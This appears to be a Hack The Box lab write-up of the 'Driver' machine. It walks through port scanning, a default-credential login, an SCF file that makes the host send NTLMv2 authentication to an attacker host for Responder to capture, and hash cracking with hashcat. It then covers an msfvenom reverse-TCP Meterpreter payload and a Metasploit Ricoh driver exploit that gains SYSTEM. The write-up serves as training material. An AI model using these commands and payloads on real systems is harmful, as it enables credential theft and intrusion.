# Driver - Hack The Box

## Enumeration

### Port Scanning

I started with an Nmap scan to identify the exposed services.

```
nmap -sC -sV  --min-rate 1000 -oN nmap.txt 10.129.95.238
```

The scan revealed the following open ports:

|Port|Service|Details|
|---|---|---|
|80|HTTP|Microsoft IIS 10.0|
|135|MSRPC|Windows RPC|
|445|SMB|Microsoft-DS|
|5985|HTTP|WinRM|

SMB enumeration using anonymous access failed with `NT_STATUS_ACCESS_DENIED`, so I moved to the web server.

### IIS Authentication

Browsing to the target's HTTP service revealed a Basic Authentication prompt with the realm:

`MFP Firmware Update Center. Please enter password for admin`

I tried the default credentials `admin:admin`, which successfully authenticated me.

The application exposed a firmware upload functionality. Uploaded firmware was stored in a directory accessible through SMB and was intended for manual inspection by developers.

![Driver 1](/assets/images/driver_image1.png)

Since uploading a reverse shell as firmware did not produce code execution, I looked for another way to exploit the developer's interaction with uploaded files.

## Initial Access

### Capturing NTLMv2 Authentication with SCF

Windows Shell Command Files (`.scf`) can trigger outbound network requests when Windows Explorer retrieves their icon from a remote UNC path. This can expose NTLM authentication material without requiring the file to be executed manually.

I created an SCF file referencing an icon hosted on my attacker machine:

```
[shell]
Command=2
IconFile=\\<ATTACKER_IP>\tools\nc.ico

[taskbar]
Command=ToggleDesktop
```

I uploaded the file through the firmware upload functionality and started Responder on my VPN interface:

```
sudo responder -I tun0 -w -v
```

When the file was accessed in the relevant Windows Explorer context, the target initiated an SMB authentication request.

Responder captured an NTLMv2 challenge-response belonging to the user `DRIVER\tony`.

> The captured challenge-response is redacted. It is not a plaintext password.

### Cracking the Captured Hash

I saved the captured NetNTLMv2 material to a file and used Hashcat with the RockYou wordlist:

```
hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

Hashcat identified the password. The recovered credential is intentionally redacted.

With the credentials recovered, I established a remote session as `tony` using Evil-WinRM.

## Privilege Escalation

### Identifying the Vulnerable Printer Driver

After obtaining access as `tony`, I inspected the PowerShell command history:

```
type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

The history revealed that a printer had been installed using the following driver:

```
Add-Printer -PrinterName "RICOH_PCL6" `
  -DriverName 'RICOH PCL6 UniversalDriver V4.23' `
  -PortName 'lpt1:'
```

The installed **RICOH PCL6 UniversalDriver V4.23** was the key finding. The driver was associated with a known privilege-escalation vulnerability, [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363).

Metasploit provides a local privilege-escalation module for this Ricoh driver issue.

### Upgrading to a Meterpreter Session

I generated a Windows x64 Meterpreter reverse-TCP payload on my attacker machine:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=<ATTACKER_IP> LPORT=6666 \
  -f exe -o meet.exe
```

I started a Metasploit handler:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST tun0
set LPORT 6666
run
```

From my Evil-WinRM session, I uploaded and executed the payload:

```
upload meet.exe
.\meet.exe
```

A Meterpreter session opened successfully. I backgrounded the session to configure the local privilege-escalation module.

### Exploiting the Ricoh Driver

I searched for the relevant Metasploit module:

```
search ricoh
use exploit/windows/local/ricoh_driver_privesc
```

I configured the Meterpreter session and reverse handler:

```
set SESSION 1
set LHOST tun0
set LPORT 4444
run
```

The module's automatic check confirmed that the target appeared vulnerable because the Ricoh driver directory had full permissions.

Metasploit created a temporary printer, exploited the vulnerable driver configuration, and opened a new Meterpreter session. The module then removed the temporary printer and cleaned up its temporary files.

### Verifying SYSTEM Access

I opened a shell in the new Meterpreter session and checked my privileges:

```
shell
whoami
```

The result was:

```
nt authority\system
```

The exploit had successfully escalated privileges to SYSTEM.

## Root Flag

I navigated to the Administrator desktop:

```
cd C:\Users\Administrator\Desktop
dir
```

## Attack Chain Summary

1. Enumerated exposed services and discovered an IIS firmware update portal.
    
2. Authenticated to the portal using default credentials.
    
3. Uploaded an SCF file to trigger outbound SMB authentication.
    
4. Captured and cracked the developer's NetNTLMv2 challenge-response.
    
5. Used the recovered credentials to access the machine as `tony`.
    
6. Identified the vulnerable Ricoh printer driver from PowerShell history.
    
7. Obtained a Meterpreter session and exploited the driver vulnerability.
    
8. Escalated privileges to `NT AUTHORITY\SYSTEM`.
